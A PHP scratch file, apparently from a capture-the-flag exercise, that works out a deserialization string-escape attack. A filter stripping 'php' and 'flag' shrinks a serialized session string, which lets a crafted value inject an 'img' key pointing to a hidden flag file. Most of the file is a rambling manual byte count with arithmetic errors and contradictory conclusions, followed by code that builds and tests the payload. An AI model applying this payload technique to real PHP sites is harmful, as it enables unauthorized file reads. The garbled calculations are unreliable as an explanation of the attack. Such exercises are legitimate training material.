<?php
// Let me trace through more carefully
// 
// Filtered: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:53:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP parses:
// a:3:{ - array with 3 elements
// s:4:"user" - key 1
// s:5:"guest" - value 1
// s:8:"function" - key 2
// s:53:" - value 2
//   PHP reads 53 bytes from position after opening quote
//   Position after opening quote: " (closing quote of empty string)
//   
//   Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   
//   Let me count this: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   3 = 1
//   : = 1
//   " = 1
//   i = 1
//   m = 1
//   g = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   2 = 1
//   0 = 1
//   : = 1
//   " = 1
//   Z = 1
//   D = 1
//   B = 1
//   n = 1
//   M = 1
//   1 = 1
//   9 = 1
//   m = 1
//   M = 1
//   W = 1
//   F = 1
//   n = 1
//   L = 1
//   n = 1
//   B = 1
//   o = 1
//   c = 1
//   A = 1
//   = = 1
//   = = 1
//   " = 1
//   ; = 1
//   } = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   3 = 1
//   : = 1
//   " = 1
//   i = 1
//   m = 1
//   g = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   2 = 1
//   0 = 1
//   : = 1
//   " = 1
//   Z = 1
//   3 = 1
//   V = 1
//   l = 1
//   c = 1
//   3 = 1
//   R = 1
//   f = 1
//   a = 1
//   W = 1
//   1 = 1
//   n = 1
//   L = 1
//   n = 1
//   B = 1
//   u = 1
//   Z = 1
//   w = 1
//   = = 1
//   = = 1
//   " = 1
//   ; = 1
//   } = 1
//   Total: 73 bytes
//   
//   PHP reads 53 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"im (53 bytes)
//   
//   Then PHP expects "; (closing quote and semicolon)
//   Next char: g (from "img")
//   Expected ", got g
//   Error!

// So the issue is that we need 53 bytes to end right before a "!

// Let me find positions where " appears:
// Position 0: "
// Position 6: "
// Position 10: "
// Position 17: "
// Position 37: "
// Position 40: "
// Position 46: "
// Position 50: "
// Position 70: "
// Position 72: "
// 
// If we make N = 45, the 46th byte is "!
// 
// PHP reads 45 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:" (45 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: i (from "img")
// Expected ", got i
// Error!

// Hmm, position 46 is ", not position 45!

// Let me recount:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Position 0: "
// Position 1: ;
// Position 2: s
// Position 3: :
// Position 4: 3
// Position 5: :
// Position 6: "
// Position 7: i
// Position 8: m
// Position 9: g
// Position 10: "
// Position 11: ;
// Position 12: s
// Position 13: :
// Position 14: 2
// Position 15: 0
// Position 16: :
// Position 17: "
// Position 18: Z
// Position 19: D
// Position 20: B
// Position 21: n
// Position 22: M
// Position 23: 1
// Position 24: 9
// Position 25: m
// Position 26: M
// Position 27: W
// Position 28: F
// Position 29: n
// Position 30: L
// Position 31: n
// Position 32: B
// Position 33: o
// Position 34: c
// Position 35: A
// Position 36: =
// Position 37: =
// Position 38: "
// Position 39: ;
// Position 40: }
// Position 41: "
// Position 42: ;
// Position 43: s
// Position 44: :
// Position 45: 3
// Position 46: :
// Position 47: "
// Position 48: i
// Position 49: m
// Position 50: g
// Position 51: "
// Position 52: ;
// Position 53: s
// ...
// 
// So " appears at positions 0, 6, 10, 17, 38, 41, 47, 51, ...

// If we make N = 46, the 47th byte is "!
// 
// PHP reads 46 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"i (46 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: m (from "img")
// Expected ", got m
// Error!

// Wait, position 47 is ", not position 46!
// 
// If PHP reads 46 bytes (positions 0-45), the next char is position 46: :
// 
// Hmm, I'm confusing myself. Let me trace through more carefully.
// 
// PHP reads N bytes from position after opening quote.
// After reading N bytes, PHP expects "; (closing quote and semicolon).
// 
// If the (N+1)th byte is ", PHP reads it as the closing quote.
// 
// So we want the (N+1)th byte to be "!
// 
// In the content, " appears at positions 0, 6, 10, 17, 38, 41, 47, 51, ...
// 
// If we make N = 46, the (N+1)th byte (position 46) is: :
// 
// We want position 46 to be "!
// 
// But position 46 is :, not "!
// 
// We need to adjust the injection so that position 46 is "!

// Let me think about this differently.
// 
// The injection is: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// This is 41 bytes.
// 
// After the injection, the remaining content is: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// This is 32 bytes.
// 
// Total: 41 + 32 = 73 bytes.
// 
// We want the (N+1)th byte to be "!
// 
// In the injection, " appears at positions 0, 6, 10, 17, 37, 40.
// 
// After the injection, " appears at positions 41+0=41, 41+6=47, 41+10=51, ...
// 
// So " appears at positions 0, 6, 10, 17, 37, 40, 41, 47, 51, ...
// 
// If we make N = 40, the (N+1)th byte (position 41) is "!
// 
// PHP reads 40 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}" (missing the last byte?)
// 
// Wait, the injection is 41 bytes, not 40!
// 
// Let me recount: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// " = 1
// ; = 1
// s = 1
// : = 1
// 3 = 1
// : = 1
// " = 1
// i = 1
// m = 1
// g = 1
// " = 1
// ; = 1
// s = 1
// : = 1
// 2 = 1
// 0 = 1
// : = 1
// " = 1
// Z = 1
// D = 1
// B = 1
// n = 1
// M = 1
// 1 = 1
// 9 = 1
// m = 1
// M = 1
// W = 1
// F = 1
// n = 1
// L = 1
// n = 1
// B = 1
// o = 1
// c = 1
// A = 1
// = = 1
// = = 1
// " = 1
// ; = 1
// } = 1
// Total: 41 bytes

// So the injection is 41 bytes.
// 
// If we make N = 40, PHP reads 40 bytes from the 41-byte injection.
// PHP reads: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";} (missing the last })
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: } (the last byte of the injection)
// Expected ", got }
// Error!

// If we make N = 41, PHP reads 41 bytes from the 41-byte injection.
// PHP reads: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: " (from the remaining content ";s:3:...)
// PHP reads: " (closing quote)
// Next char: ;
// PHP reads: ; (semicolon)
// 
// PHP found "; and continues parsing!
// 
// The next chars are: s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// PHP parses this as the remaining elements!

// So we need N = 41!

// But we have 3 'flag's, so N = 12 + 41 = 53.
// 
// We need N = 41, so we need 0 'flag's!
// 
// But if we have 0 'flag's, there's no shrinking!

// The key insight: we need the filter to shrink the string by EXACTLY the right amount!
// 
// Each 'flag' (4 bytes) -> '' (0 bytes), shrinking by 4 bytes.
// 
// If we have N 'flag's, the serialized length is 4*N + len(injection).
// After filter, the length is len(injection).
// 
// PHP reads 4*N + len(injection) bytes from len(injection) bytes.
// PHP reads 4*N extra bytes from the remaining content!
// 
// We want the (4*N + len(injection) + 1)th byte to be "!
// 
// The remaining content after the injection is: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// We want the (4*N + 1)th byte of the remaining content to be "!
// 
// In the remaining content, " appears at positions 0, 6, 10, 17, 28, 30.
// 
// If 4*N + 1 = 1, then N = 0. But we need at least 1 'flag' for shrinking!
// If 4*N + 1 = 7, then N = 1.5. Not an integer!
// If 4*N + 1 = 11, then N = 2.5. Not an integer!
// If 4*N + 1 = 18, then N = 4.25. Not an integer!
// If 4*N + 1 = 29, then N = 7. Not an integer!
// If 4*N + 1 = 31, then N = 7.5. Not an integer!

// Hmm, none of these work!

// Let me try a different approach:
// What if we use 'php' (3 bytes) instead of 'flag' (4 bytes)?
// 
// Each 'php' (3 bytes) -> '' (0 bytes), shrinking by 3 bytes.
// 
// If we have N 'php's, the serialized length is 3*N + len(injection).
// After filter, the length is len(injection).
// 
// PHP reads 3*N extra bytes from the remaining content!
// 
// We want the (3*N + 1)th byte of the remaining content to be "!
// 
// If 3*N + 1 = 1, then N = 0. But we need at least 1 'php' for shrinking!
// If 3*N + 1 = 7, then N = 2. This works!
// 
// So we need 2 'php's!
// 
// Let me test:
// function = 'php' * 2 + injection = 6 + 41 = 47 bytes
// 
// After filter: injection = 41 bytes
// 
// Serialized: s:47:"phpphp";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:47:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads 47 bytes from ""
// Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP reads 47 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z (47 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: 3 (from "3Vlc3Rf...")
// Expected ", got 3
// Error!

// Hmm, still doesn't work!

// Let me recalculate:
// 3*N + 1 = 7, so N = 2.
// 
// The (3*2 + 1)th byte = 7th byte of the remaining content.
// 
// Remaining content: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Position 0: "
// Position 1: ;
// Position 2: s
// Position 3: :
// Position 4: 3
// Position 5: :
// Position 6: "
// Position 7: i
// 
// So the 7th byte is: i
// 
// We want the 7th byte to be "!
// 
// But the 6th byte is ", not the 7th!

// I think I'm off by one. Let me recalculate.
// 
// PHP reads N bytes from the injection.
// After reading N bytes, PHP expects "; (closing quote and semicolon).
// 
// If the (N+1)th byte is ", PHP reads it as the closing quote.
// 
// So we want the (N+1)th byte to be "!
// 
// The injection is 41 bytes.
// The remaining content after the injection is: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// If we have M 'flag's, PHP reads 4*M + 41 bytes.
// 
// The (4*M + 41 + 1)th byte is the (4*M + 1)th byte of the remaining content.
// 
// We want the (4*M + 1)th byte of the remaining content to be "!
// 
// Remaining content: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Position 0: "
// Position 1: ;
// Position 2: s
// Position 3: :
// Position 4: 3
// Position 5: :
// Position 6: "
// ...
// 
// So " appears at positions 0, 6, 10, 17, 28, 30.
// 
// We want 4*M + 1 = 1, 7, 11, 18, 29, or 31.
// 
// 4*M + 1 = 1 => M = 0. But we need M >= 1 for shrinking!
// 4*M + 1 = 7 => M = 1.5. Not an integer!
// 4*M + 1 = 11 => M = 2.5. Not an integer!
// 4*M + 1 = 18 => M = 4.25. Not an integer!
// 4*M + 1 = 29 => M = 7. Not an integer!
// 4*M + 1 = 31 => M = 7.5. Not an integer!

// None of these work with 'flag'!

// Let me try with 'php' (3 bytes):
// 3*M + 1 = 1, 7, 11, 18, 29, or 31.
// 
// 3*M + 1 = 1 => M = 0. But we need M >= 1!
// 3*M + 1 = 7 => M = 2. This works!
// 
// So we need 2 'php's!

// Let me test:
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$injection = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
echo "Injection: $injection\n";
echo "Injection length: " . strlen($injection) . "\n\n";

$_SESSION = [];
$_SESSION['user'] = 'guest';
$_SESSION['function'] = 'phpphp' . $injection;
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);
echo "\n";

// Let me also check the remaining content
$remaining = '";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}';
echo "Remaining content: $remaining\n";
echo "Positions of \":\n";
for ($i = 0; $i < strlen($remaining); $i++) {
    if ($remaining[$i] === '"') {
        echo "Position $i: \"\n";
    }
}

